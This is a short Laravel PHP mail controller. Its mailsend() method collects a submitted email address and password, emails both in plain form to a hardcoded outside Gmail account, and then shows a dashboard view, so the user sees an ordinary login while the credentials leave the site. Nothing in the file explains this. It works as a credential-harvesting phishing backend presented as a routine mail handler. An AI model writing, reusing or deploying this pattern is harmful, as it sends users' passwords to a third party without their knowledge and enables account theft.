<?php

namespace App\Http\Controllers;
use App\Mail\ContectMail;
// use mail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
class MailController extends Controller
{
    public function send() {
return view("mail");
    }
    public function mailsend(Request $request) {
        $mail_data=[
            'password'=>$request->password,
            'email'=>$request->email,
        ];
        Mail::to('codingcommunity.in@gmail.com')->send(new ContectMail($mail_data));
        return view('dashboard') ;
            }
}
